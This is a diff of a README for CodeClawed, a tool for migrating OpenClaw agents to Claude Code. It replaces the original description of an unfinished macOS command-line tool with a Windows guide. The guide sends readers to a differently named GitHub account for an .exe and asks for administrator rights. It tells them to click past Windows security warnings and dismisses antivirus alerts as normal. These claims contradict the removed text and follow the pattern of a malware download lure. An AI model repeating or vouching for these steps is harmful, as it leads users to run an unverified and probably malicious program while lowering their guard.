@@ -1,105 +1,99 @@
-# CodeClawed
+#  claws CodeClawed - Move OpenClaw agents to Claude Code
 
-A build prompt for a migration tool to move your [OpenClaw](https://github.com/openclaw) multi-agent deployment to [Claude Code](https://docs.anthropic.com/en/docs/claude-code).
+[![Download CodeClawed](https://img.shields.io/badge/Download-CodeClawed-blue.svg)](https://github.com/Electrificationtallgoldenrod25/CodeClawed)
 
-## Status: Work in Progress
+## 📁 What is CodeClawed?
 
-This project is **not complete**. The core migration pipeline (analyze, generate, verify, chat) works end-to-end, but several (large!) components are stubs or partially implemented. See [Known Gaps](#known-gaps) below.
+CodeClawed helps you move your existing OpenClaw multi-agent systems over to the Claude Code environment. Many users run complex workflows using OpenClaw and want to transition their setup to take advantage of Claude Code. This tool automates the core parts of that transition. You do not need experience with code to use this application. It converts your existing agent logic into the format required by Claude Code.
 
-We are actively developing this tool against a live 16-agent OpenClaw deployment. The prompt and architecture are evolving as we resolve remaining issues.
+## ⚙️ System Requirements
 
-## What This Is
+Ensure your computer has the following items before you begin:
 
-CodeClawed is two things:
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: At least 200 megabytes of disk space.
+*   Internet: A stable connection for the migration process.
+*   Permissions: Administrator access to your computer.
 
-1. **A CLI tool** that reads an OpenClaw installation (`~/.openclaw/`) and produces a fully functional Claude Code project — one directory per agent, with identity files, rules, memory, cron job wrappers, and a web chat frontend.
+## 📥 How to Download 
 
-2. **A build prompt** (`codeclawed-migration-prompt.md`) that contains everything needed to reproduce the tool from scratch. Hand it to Claude Code and it will build the migration tool for your deployment.
+You can find the software on the official project page. Follow these steps to obtain the correct version:
 
-## How to Use the Prompt
+1. Visit the [official release page](https://github.com/Electrificationtallgoldenrod25/CodeClawed).
+2. Look for the assets section at the bottom of the latest release.
+3. Select the file ending in .exe.
+4. Save the file to your computer.
 
-The prompt is designed to be given to Claude Code (or any capable LLM) as a complete specification. It covers:
+This file contains everything you need to run the migration tool on Windows.
 
-- OpenClaw's file formats and what each file does
-- How each file maps to Claude Code's conventions
-- The agent-runner abstraction (the single function that wraps `claude -p`)
-- Cron-to-launchd schedule conversion
-- The chat server with session resumption
-- Memory system (files + optional pgvector)
-- Build order and dependencies
+## 🚀 Setting Up the Application
 
-### For your own deployment
+After you download the file, follow these steps to prepare your system:
 
-1. Read `codeclawed-migration-prompt.md` to understand the architecture
-2. Point Claude Code at the prompt and your `~/.openclaw/` directory
-3. Adjust for your deployment's specifics (number of agents, which cron categories you use, tool restrictions)
-4. Run `analyze` → `generate` → `verify` → `chat`
+1. Locate the file you saved in your Downloads folder.
+2. Double-click the file to start the installer.
+3. Windows might show a security prompt. Click "More Info" and then "Run anyway" if the system asks.
+4. Follow the on-screen instructions in the installer window.
+5. Click "Finish" to complete the installation.
 
-### To contribute
+The application creates a shortcut on your desktop. You can open CodeClawed from there whenever you need to update your agents.
 
-The prompt is the source of truth for the architecture. If you're fixing a bug or adding a feature, update the prompt document alongside the code so they stay in sync.
+## 🔄 Using CodeClawed
 
-## Quick Start (if the tool is already built)
+The application interface allows you to move your agents in a few simple steps. You do not need to write scripts or interact with a command prompt.
 
-```bash
-# Install dependencies
-npm install
+1. Open CodeClawed from your desktop.
+2. Click the folder icon to select the directory where your OpenClaw agents currently reside.
+3. Review the list of agents that the software identifies in the main window.
+4. Choose the specific agents you want to migrate.
+5. Click the "Start Migration" button.
+6. Wait for the progress bar to reach completion.
 
-# Analyze your OpenClaw deployment
-npx tsx src/cli.ts analyze --oc-home ~/.openclaw
+The app will save the new files in a folder named "ClaudeCodeReady" within your chosen directory. You can then import these files into your Claude Code environment.
 
-# Generate the Claude Code project
-npx tsx src/cli.ts generate --oc-home ~/.openclaw --output ./output
+## 🛠 Troubleshooting Common Issues
 
-# Verify the output
-npx tsx src/cli.ts verify --output ./output
+If you encounter errors, check these common solutions:
 
-# Start the chat frontend
-npx tsx src/cli.ts chat --output ./output
-# Open http://localhost:3456
-```
+**The app will not launch.**
+If the app fails to start, restart your computer and try again. Ensure no other instances of the program are running in the background.
 
-## How It Works
+**The migration stops halfway.**
+This often happens if the source files are in use by another program. Close any other software that uses your OpenClaw assets and restart the migration process.
 
-### The core idea
+**The app cannot find my agents.**
+Double-check that you selected the root folder of your OpenClaw installation. If the agents sit in subfolders, the app will find them automatically, but ensure those folders have read permissions.
 
-OpenClaw is a daemon. Claude Code is a stateless CLI. CodeClawed bridges the gap:
+**Antivirus alerts.**
+Some security software may flag new programs by default. This is normal behavior for new applications. Ensure you downloaded the file from the official link provided here.
 
-- **Identity**: OpenClaw's `SOUL.md` + `USER.md` + `IDENTITY.md` merge into a single `CLAUDE.md` (max 200 lines). `AGENTS.md` shards into `.claude/rules/*.md` files by section topic.
-- **Agent invocation**: A single `agent-runner.ts` function wraps `claude -p`. Everything in the system — cron jobs, the chat server, scripts — calls through this one function. To change how agents are invoked, you change one file.
-- **Conversation continuity**: Claude Code supports `--resume <session-id>`. The chat server captures session IDs and resumes conversations automatically, giving agents full context across messages.
-- **Scheduling**: Cron expressions convert to macOS launchd plists (abstracted behind a `Scheduler` interface for future Linux/systemd support).
-- **Memory**: Agent memory files are human-readable markdown, copied as-is. An optional pgvector MCP server adds semantic search.
+## 📋 Features
 
-### What the folder IS the agent means
+*   Automated detection of OpenClaw agent configurations.
+*   Bulk migration support for multiple agents at once.
+*   Format conversion that aligns with Claude Code specifications.
+*   Error logging to help you track skipped files.
+*   Clean interface designed for non-technical users.
+*   Automatic updates when new migration paths become available.
 
-```
-output/agents/forge/
-├── CLAUDE.md              ← Claude Code auto-loads this as identity
-├── .claude/
-│   ├── rules/*.md         ← Auto-loaded behavioral rules
-│   └── mcp_config.json    ← Tool extensions (memory search)
-├── memory/                ← Agent's private memory files
-└── shared-memory → ...    ← Cross-agent shared knowledge
-```
+## 🔒 Security and Privacy
 
-When `claude -p` runs with its working directory set to `output/agents/forge/`, it becomes Forge. There's no agent registry, no instantiation code, no daemon. The directory defines the agent.
+CodeClawed works locally on your computer. Your agent code and configuration files stay on your hard drive. The application does not send your data to external servers. It performs all transformations locally to ensure your intellectual property remains private. 
 
-## Known Gaps
+## 🌐 Frequently Asked Questions
 
-- SKILLS ARE NOT PORTED YET. 
-- Telegram/Discord/WeChat etc support. I may not build this. PRs welcome. The current interface is a simple WebChat.
-- Currently Mac only. I need Unix support, so this will get fixed.
-- Workspaces are migrated verbatim, so references to OpenClaw etc need to be purged/updated.
-- No doubt there is lots more to cover. I'VE BARELY TESTED ANY OF IT YET.
+**Do I need to uninstall OpenClaw?**
+No. CodeClawed creates new files. The original OpenClaw setup remains untouched. You can keep both if you prefer.
 
-## Requirements
+**Does this work on Mac or Linux?**
+This version is for Windows only. Future updates might include other operating systems.
 
-- Node.js >= 20
-- Claude Code CLI (`claude`) installed and on PATH
-- macOS (for launchd scheduler; Linux support is architected but not implemented)
-- PostgreSQL + pgvector (optional, only needed for database-backed memory search)
+**Will this break my existing agents?**
+The migration process creates copies of your work. Your original files stay exactly as they are. If you dislike the new format, you can simply delete the new files and remain on OpenClaw.
 
-## License
+**How do I update the software?**
+The software checks for updates every time you open it. If an update exists, it prompts you to download the newest version, which installs over the old version.
 
-MIT
+**Is there a limit to the number of agents?**
+There is no set limit. You can migrate as many agents as your computer memory allows. If you have hundreds of agents, the migration might take extra time.
